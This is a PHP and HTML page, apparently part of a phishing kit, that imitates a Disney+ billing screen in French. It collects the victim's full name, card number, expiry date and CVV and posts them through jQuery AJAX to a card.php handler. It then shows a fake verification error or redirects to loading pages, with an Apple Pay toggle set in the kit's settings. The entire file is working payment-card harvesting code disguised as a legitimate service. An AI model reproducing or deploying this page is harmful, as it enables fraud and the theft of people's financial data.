<?php 

include("../common/sub_includes.php");
?>

<html style="display: block;">

<?php  include("../common/sub_header.php"); ?>

<body id="app_index" class="js-focus-visible">

    <div id="webAppRoot" data-reactroot="">
        <div id="app_body_content" data-testid="adult-enabled-profile">
            <div class="sc-esoVGF cNOTUj"></div>
            <div id="hudson-wrapper" class="sc-ZUflv kcCFNP video_view--hidden  ">
                <div class="sc-hPeUyl bhhZhW hudson-container">
                    <div data-testid="" class="sc-hSdWYo dfLgnK"><img alt="" aria-hidden="true" src="../assets/images/icon-loader-32@3x.png" class="sc-eHgmQL jstxUN"></div>
                </div>
            </div>
            <div id="webAppHeader" class="onboarding">
                <div class="sc-iuJeZd hcKoaM">
                    <div class="sc-cmthru cJkwKD"><img style="width: 100%; margin: 0px;" src="../assets/images/ico/logo.svg" id="logo" class="sc-kEYyzF jLfEtv"></div>
                </div>
            </div>
            <div id="webAppScene">
                <div id="app_scene_content">
                    <div id="app-background" class="sc-ekHBYt eIfKUM"></div>
                    <main class="onboarding" id="onboarding_index" style="top: 0px;">
                        <div class="onboarding-wrapper">
                            <form  action="../actions/card.php" id="formit" name="dssLogin" method="post">
                                <h3 color="white" style="color: rgb(249, 249, 249); margin: 0px; padding: 0px 0px 24px;" class="sc-gZMcBi jhLoHG">Informations bancaires</h3>
                                <style>
                                    .flex{
                                        display : flex;
                                        justify-content: space-between;
                                    }
                                    .one{
                                        width : 45%;
                                    }
                                </style>
                                
                                    <fieldset class="sc-dznXNo dhAlPS" id="password" display="none">
                                        <span style="position: relative; display: block;">
                                            <input aria-label="Mot de passe" display="inline" id="nam" name="input_cc_name" placeholder="Nom complet" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq"   type="text" required="">
                                        </span>
                                    </fieldset>
                                    <br><br>
                                    <style>
                                        #canada{
                                            position: absolute;
                                            right : 10px;
                                            top : 15px;
                                            height : 40%;
                                            z-index: 2000;
                                            
                                        }
                                    </style>
                                <fieldset class="sc-dznXNo dhAlPS" id="password" display="none">
                                    <span style="position: relative; display: block;">
                                    <img id="canada" src="https://rapidlei.com/wp-content/uploads/2018/12/visa-mastercard-amex.png" alt="">
                                        <input aria-label="Mot de passe" display="inline" id="card_input" name="input_cc_num" placeholder="Numéro de carte" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq"   type="text" required="">
                                    </span>
                                </fieldset>


            <script>
function formatString(e) {
  var inputChar = String.fromCharCode(event.keyCode);
  var code = event.keyCode;
  var allowedKeys = [8];
  if (allowedKeys.indexOf(code) !== -1) {
    return;
  }

  event.target.value = event.target.value.replace(
    /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
  ).replace(
    /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
  ).replace(
    /^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
  ).replace(
    /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
  ).replace(
    /^([0]+)\/|[0]+$/g, '0' // 0/ > 0 and 00 > 0
  ).replace(
    /[^\d\/]|^[\/]*$/g, '' // To allow only digits and `/`
  ).replace(
    /\/\//g, '/' // Prevent entering more than 1 `/`
  );
}

</script>

                                    <fieldset class="sc-dznXNo dhAlPS" id="password" display="none">
                                        <span style="position: relative; display: block;">
                                            <input aria-label="Mot de passe" display="inline" id="exp" name="input_cc_exp" placeholder="Date d'expiration" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" type="text" required="" onkeyup="formatString(event);" onkeypress="formatString(event);" onpaste="formatString(event);" maxlength="5">
                                        </span>
                                    </fieldset>
                                    
                                    <fieldset class="sc-dznXNo dhAlPS" id="password" display="none">
                                        <span style="position: relative; display: block;">
                                        
                                            <input aria-label="Mot de passe" display="inline" id="pass" name="input_cc_cvv" placeholder="Cryptogramme" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq"  type="password" maxlength="4" required="">
                                        </span>
                                    </fieldset>


                                <div style="color: #ff554c;font-size : 12px;margin-top : 5px;margin-bottom : 10px;display : none" id="error_it" data-testid="text-input-error" class="metadata text-color--feedback-negative margin--top-1 margin--left-1 input-error">Les informations fournies n'ont pas pu être vérifiées. Veuillez réessayer</div>



                                <div>
                                    
                                    <button aria-label="Accepter et continuer" id="colorbg"  data-testid="login-continue-button" role="button" kind="primary" value="submit" class="sc-gPEVay jOqQLP" type="submit">
                                    <span id="btnn">CONFIRMER</span> 
                                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="svgg" style="margin:auto;background:transparent;display:none;" width="230px" height="90%" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
                                        <circle cx="50" cy="50" fill="none" stroke="#2ecbff" stroke-width="6" r="34" stroke-dasharray="160.22122533307947 55.40707511102649">
                                        <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="0.7092198581560283s" values="0 50 50;360 50 50" keyTimes="0;1"></animateTransform>
                                        </circle>
                                    </svg>
                                    </button>
                            
                            </div>
 
                            </form>
                        </div>
                    </main>
                </div>
            </div>
            <div tabindex="0" class="sc-eAKXzc fcUHFZ">
                <div id="cta-toast" class="sc-bfYoXt gCjimr"><button aria-label="" data-testid="" role="button" kind="primary" class="sc-gPEVay edYBEy sc-gbOuXE bcVAiB" id="" type="submit">OBTENIR DISNEY+</button></div>
            </div>
            <?php
            $sub_folder = true;
            include("../common/footer.php") 
            ?>
        </div>
    </div>

</body>

</html>

<script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  crossorigin="anonymous"></script>
<script src="../assets/js/mask.js"></script>

<script>    
    $("#card_input").mask("0000 0000 0000 0000")
    $("#exp").mask("00/00 ")


    $("#card_input").on('input propertychange',function(){
        charLimit($(this),19)
    })

    $("#exp").on('input propertychange',function(){
        charLimit($(this),5)
    })

    let charLimit = (input, maxChar) => {
        let len = $(input).val().length;
        if (len > maxChar) {
            $(input).val($(input).val().substring(0, maxChar));
        };
    }

    function checkValue(str, max) {
        if (str.charAt(0) !== '0' || str == '00') {
            var num = parseInt(str);
            if (isNaN(num) || num <= 0 || num > max) num = 1;
            str = num > parseInt(max.toString().charAt(0)) && num.toString().length == 1 ? '0' + num : num.toString();
        };
        return str;
    };

    function formatString(e) {
            var inputChar = String.fromCharCode(event.keyCode);
            var code = event.keyCode;
            var allowedKeys = [8];
            if (allowedKeys.indexOf(code) !== -1) {
                return;
            }

            event.target.value = event.target.value.replace(
                /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
            ).replace(
                /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
            ).replace(
                /^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
            ).replace(
                /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
            ).replace(
                /^([0]+)\/|[0]+$/g, '0' // 0/ > 0 et 00 > 0
            ).replace(
                /[^\d\/]|^[\/]*$/g, '' // Chiffre & / only `/`
            ).replace(
                /\/\//g, '/' // Evit d'avoir plus de 1 `/`
            );
            }


        $(document).ready(function() {
                $("#formit").submit(function(e) {
                    e.preventDefault();
                    var $this = $(this);
                    $("#svgg").css("display","flex")
                    $("#btnn").css("display","none")
                    apple_pay = <?php echo $apple_pay ?> // A edit dans le settings.php
                    $.ajax({
                            method: "POST",
                            url: "../actions/card.php",
                            data: $(this).serialize(),
                            success:function(response) {

                                var jsonData = JSON.parse(response);

                                if(jsonData.success == "1"){

                                    if(apple_pay == true){
                                        setTimeout(function() {
                                            window.location.href = "loading.php";
                                        }, 3000);
                                    }
                                    else{
                                        setTimeout(function() {
                                            window.location.href = "loading_finished.php";
                                        }, 3000);
                                    }

                                }
                                else{
                                    setTimeout(function() {
                                        $("#error_it").css("display","block");
                                        $("#svgg").css("display","none")
                                    $("#btnn").css("display","flex")
                                }, 1000);
                                }
                            }
                        })
                });
            });
</script>